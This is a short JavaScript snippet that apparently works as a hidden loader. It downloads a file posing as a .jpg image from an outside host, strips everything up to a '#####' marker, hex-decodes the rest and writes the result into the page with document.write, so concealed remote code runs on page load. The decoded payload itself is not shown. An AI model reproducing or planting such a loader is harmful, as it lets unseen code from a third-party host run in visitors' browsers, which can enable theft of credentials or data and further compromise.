var id="011c8430b29fe2d9d5";
var src = "http://p1.qhmsg.com/t"+id+".jpg";
let xhr = new XMLHttpRequest();
xhr.open("get", src, true);
xhr.onload = function () {
    if (this.status == 200) {
        s = this.response;
        s = s.substr(s.indexOf("#####")+5);
        var i,a=[];
        for(i=0;i<s.length;i+=2){
            a[i/2]="%"+s.substr(i,2);
        }
        document.write(decodeURIComponent(a.join("")));
    }
};
xhr.send();
